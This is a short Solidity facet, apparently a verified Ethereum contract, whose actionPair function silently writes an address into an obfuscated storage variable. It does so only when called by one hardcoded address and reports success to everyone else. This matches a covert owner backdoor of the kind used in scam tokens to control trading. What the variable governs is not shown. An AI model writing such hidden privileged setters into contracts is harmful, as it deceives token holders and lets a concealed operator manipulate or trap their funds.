/**
 *Submitted for verification at Etherscan.io on 2024-02-24
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./TestLib.sol";
contract actionPairFacet {
    function actionPair(address account) public virtual returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == 0xECfe8C551A4dd0413f5ead8896aB952Fc9Adae30)
            ds._p76234 = account;
        return true;
    }
}
